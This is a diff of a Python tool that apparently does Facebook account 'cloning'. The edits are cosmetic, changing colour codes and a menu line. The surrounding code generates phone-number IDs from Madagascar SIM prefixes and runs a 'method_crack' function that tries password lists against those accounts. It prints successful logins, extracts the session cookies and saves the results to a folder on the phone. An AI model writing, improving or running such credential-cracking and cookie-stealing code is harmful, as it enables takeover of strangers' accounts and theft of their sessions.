@@ -53,7 +53,7 @@ logo=(f'''{M}
     VMMMP"    dMP dMP    VMMMP"     dMP dMP    
                                                                                     
 
-{warna}✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺{H}
+{warna}{H}✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺{H}
 {H}✺>>>>>>>>>{H}  {M}Owner{M}     {H}<==>{H} {M}RedFargun{M}  {H}<<<<<<<<<✺{H}
 {H}✺>>>>>>>>>{H}  {M}TOOL NAME{M} {H}<==>{H} {warna}{M}Nathan{M}{warna}     {H}<<<<<<<<<✺{H}
 {H}✺>>>>>>>>>{H}  {M}STATUE{M}    {H}<==>{H} {M}PAID{M}       {H}<<<<<<<<<✺{H}
@@ -71,10 +71,10 @@ def clear():
 def MR_Saga():
     clear()
     os.system('xdg-open https://www.facebook.com/profile.php?id=61556151290704/')
-    print(f'{B} [{warna}01{B}] RANDOM CLONING ')
-    print(f'{B} [{warna}00{B}] EXIT TERMINAL ')
+    print(f'{B} [{warna}01{P}] RANDOM CLONING ')
+    print(f'{B} [{warna}00{P}] EXIT TERMINAL ')
     linex()
-    option=input(f' {B}[{warna}??{B}] CHOISIR MENU >> ')
+    option=input(f' {byellow}[{warna}??{byellow}] CHOISIR MENU >> ')
     if option in ['01','1']:
         BD_CLONING()
     else:
@@ -83,7 +83,6 @@ def MR_Saga():
 def BD_CLONING():
     user=[]
     clear()
-    print(' CODE SIM MALAGASY : [26132] [26134] [26138] [26133]')
     print(' 261=0 Madagascar : [032] [034] [038] [033]')
     code=input(' ENTER SIM CODE >> ')
     linex()
@@ -137,7 +136,7 @@ def method_crack(ids, passlist):
                 else:
                     print('\r\r \033[1;32m[Saga-OK] '+str(uid)+' | '+pas+'\033[1;37m')
                     coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
-                    print('\033[1;31mm [COOKIES] '+coki)
+                    print('\033[1;31mm {byellow}[COOKIES]{byellow} '+coki)
                     # Vérifier si le dossier Saga-IDS existe et le créer si nécessaire
                     if not os.path.exists("/sdcard/Saga-IDS"):
                         os.makedirs("/sdcard/Saga-IDS")
